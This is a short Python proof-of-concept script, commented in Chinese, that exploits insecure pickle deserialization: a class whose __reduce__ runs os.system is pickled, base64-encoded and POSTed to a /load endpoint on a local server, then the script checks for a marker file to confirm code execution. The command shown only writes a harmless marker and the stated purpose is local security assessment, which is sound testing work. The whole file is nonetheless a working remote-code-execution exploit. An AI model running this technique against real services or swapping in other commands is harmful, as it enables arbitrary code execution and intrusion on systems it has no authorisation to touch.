"""PoC: 向 /load 投递恶意 pickle，触发任意代码执行（写标记文件）。仅用于本地安全评估。"""
import base64
import http.client
import os
import pickle
import sys
import tempfile

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8088
MARKER = os.path.join(tempfile.gettempdir(), "poc_pickle_8842.marker")
if os.path.exists(MARKER):
    os.remove(MARKER)


class RCE:
    def __reduce__(self):
        # 反序列化时执行：向临时目录写标记文件，证明可执行任意代码
        cmd = "echo PWNED_PICKLE_8842 > " + MARKER
        return (os.system, (cmd,))


payload = base64.b64encode(pickle.dumps(RCE())).decode("ascii")
conn = http.client.HTTPConnection("127.0.0.1", PORT, timeout=15)
conn.request("POST", "/load", body=payload.encode("ascii"),
             headers={"Content-Type": "text/plain"})
resp = conn.getresponse()
body = resp.read().decode("utf-8", errors="replace")
conn.close()
print("HTTP", resp.status)
print("body:", body[:200])
print("marker exists:", os.path.exists(MARKER))
if os.path.exists(MARKER):
    with open(MARKER) as fh:
        print("marker content:", fh.read().strip())
